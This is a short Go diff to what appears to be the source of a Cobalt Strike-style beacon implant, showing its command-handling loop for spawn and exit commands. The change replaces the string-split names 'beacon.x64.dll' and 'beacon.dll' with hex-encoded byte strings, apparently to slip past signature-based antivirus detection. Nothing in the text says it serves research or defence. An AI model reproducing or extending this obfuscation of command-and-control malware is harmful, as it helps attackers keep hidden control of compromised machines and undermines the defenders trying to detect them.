@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"main/config"
@@ -9,7 +10,6 @@ import (
 	"main/packet"
 	"main/services"
 	"os"
-	"strings"
 	"time"
 )
 
@@ -94,7 +94,8 @@ func main() {
 								result, err = services.CmdExit()
 								callbackType = 0
 							case packet.CMD_TYPE_SPAWN_X64:
-								if strings.Contains(strings.ReplaceAll(string(cmdBuf), "\x00", ""), "be"+"ac"+"on.x6"+"4.dll") {
+								bx64, _ := hex.DecodeString("626561636f6e2e7836342e646c6c") //beacon.x64.dll
+								if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx64) {
 									filename, _ := os.Executable()
 									result, err = services.CmdExecute([]byte(filename), Token)
 								} else {
@@ -102,7 +103,8 @@ func main() {
 								}
 								callbackType = 0
 							case packet.CMD_TYPE_SPAWN_X86:
-								if strings.Contains(strings.ReplaceAll(string(cmdBuf), "\x00", ""), "bea"+"con.d"+"ll") {
+								bx86, _ := hex.DecodeString("626561636f6e2e646c6c") //beacon.dll
+								if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx86) {
 									filename, _ := os.Executable()
 									result, err = services.CmdExecute([]byte(filename), Token)
 								} else {
